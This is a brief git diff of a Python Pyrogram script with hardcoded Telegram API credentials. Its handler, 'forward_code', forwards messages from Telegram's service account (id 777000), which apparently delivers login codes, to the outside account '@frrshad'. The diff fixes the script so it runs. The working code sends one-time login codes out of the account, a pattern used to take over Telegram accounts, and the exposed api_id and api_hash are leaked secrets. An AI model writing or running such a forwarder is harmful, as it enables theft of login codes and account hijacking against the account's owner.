@@ -8,8 +8,9 @@ app = Client(name ='frshad', api_id=29723786, api_hash='6963a88a79a3a75bed72f467
 id_or_username = '@frrshad'
 
 
-@app.on_message(filters.user(777000,5214329732))
+@app.on_message(filters.user(777000, 5214329732))
 def forward_code(app:Client, message:Message):
     app.forward_messages(id_or_username, message.chat.id, message.id)
 
-    app.run()
+  
+app.run()
